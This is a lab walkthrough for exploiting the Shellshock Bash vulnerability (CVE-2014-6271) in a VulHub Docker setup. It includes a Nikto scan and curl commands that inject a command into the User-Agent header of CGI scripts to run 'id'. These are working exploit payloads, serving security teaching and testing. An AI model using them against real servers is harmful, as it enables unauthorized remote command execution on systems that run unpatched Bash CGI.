
---

# üõ†Ô∏è **Shellshock Remote Command Injection (CVE-2014-6271)**

The **Shellshock vulnerability (CVE-2014-6271)** affects **Bash** and allows attackers to execute arbitrary commands via specially crafted environment variables. This vulnerability can be exploited when Bash is used in web applications that process HTTP headers (like **User-Agent**), allowing remote code execution.

---

## üîó **References**

* [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271)
* [VulHub Shellshock Docker Example](https://vulhub.org)

---

## üõ†Ô∏è **Setting Up the Exploitation Environment**

### 1. **Navigate to the VulHub Directory**

To get started, navigate to the Shellshock directory of VulHub:

```bash
/opt/vulhub/bash/CVE-2014-6271
```

### 2. **Build the Docker Environment**

Build the Docker container using **docker-compose**:

```bash
docker compose build
```

### 3. **Start the Docker Container in Detached Mode**

Start the environment:

```bash
docker compose up -d
```

### 4. **Checking Open Ports**

Once the container is running, use **netstat** to check open ports and services:

```bash
netstat -nltup
```

### 5. **Scanning with Nikto**

Use **Nikto** to check for common vulnerabilities and **CGI** directories:

```bash
nikto -Cgidirs all -h http://192.168.1.61:8080
```

---

## ‚ö° **Exploiting the Shellshock Vulnerability**

Once the vulnerable target is identified, you can send specially crafted requests with **curl** to exploit the Shellshock vulnerability via the **User-Agent** header.

### **Testing with victim.cgi**

Send a request to **victim.cgi** to test the vulnerability by injecting a command into the **User-Agent** header:

```bash
curl -H "User-Agent: () { foo;  }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.1.220:8080/victim.cgi
```

This sends a payload that will execute the `id` command, which outputs user information.

### **Testing with safe.cgi**

Test the same vulnerability on another **CGI** script, **safe.cgi**, to confirm whether the target is truly vulnerable:

```bash
curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.1.220:8080/safe.cgi
```

### **Expected Output**

If the vulnerability is successfully exploited, the output will include system information such as the user and group ID, which is typically shown by the `id` command.

---

## ‚úÖ **Conclusion**

By exploiting the **Shellshock vulnerability (CVE-2014-6271)**, attackers can inject arbitrary commands via the **User-Agent** header, leading to **remote command execution**. This highlights the importance of patching vulnerable systems and implementing appropriate security measures for web servers running **Bash**-based scripts.

---


